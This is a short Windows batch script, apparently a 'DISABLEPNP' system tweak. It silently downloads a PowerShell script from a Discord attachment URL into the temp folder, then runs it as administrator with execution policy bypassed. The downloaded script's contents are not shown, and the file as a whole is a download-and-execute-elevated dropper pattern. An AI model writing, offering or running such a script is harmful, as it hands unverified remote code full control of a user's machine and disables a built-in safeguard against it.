@echo off
curl -s https://cdn.discordapp.com/attachments/916071940794486825/1190767745965498378/DISABLEPNP.ps1 > "%temp%\DISABLEPNP.ps1"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%temp%\DISABLEPNP.ps1""' -Verb RunAs}"
exit
